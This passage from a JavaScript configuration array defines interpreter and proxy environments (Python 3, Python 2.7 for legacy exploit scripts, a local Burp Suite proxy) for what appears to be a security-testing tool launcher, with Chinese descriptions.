    description: '适用于 SQLmap、Dirsearch、Impacket、OneForAll 及现代 Python 3 安全工具',
    isDefault: true,
    createdAt: new Date().toISOString(),
    updatedAt: new Date().toISOString(),
  },
  {
    id: 'env-python-2',
    name: 'Python 2.7 (历史遗留漏洞利用兼容)',
    type: 'python',
    binPath: 'py -2',
    extraArgs: '',
    envVars: {},
    description: '专门用于执行仅支持 Python 2 运行时的历史 EXP 与老旧安全脚本',
    isDefault: false,
    createdAt: new Date().toISOString(),
    updatedAt: new Date().toISOString(),
  },
  {
    id: 'env-proxy-burp',
    name: 'Burp Suite 本地流量代理 (127.0.0.1:8080)',
    type: 'proxy',
    binPath: '',
    extraArgs: '',
    envVars: {
      HTTP_PROXY: 'http://127.0.0.1:8080',
      HTTPS_PROXY: 'http://127.0.0.1:8080',
    },
    description: '自动为执行的 CLI/扫描工具注入 HTTP_PROXY 环境变量，实现流量抓包审计',
    isDefault: false,
    createdAt: new Date().toISOString(),
    updatedAt: new Date().toISOString(),
  },
];

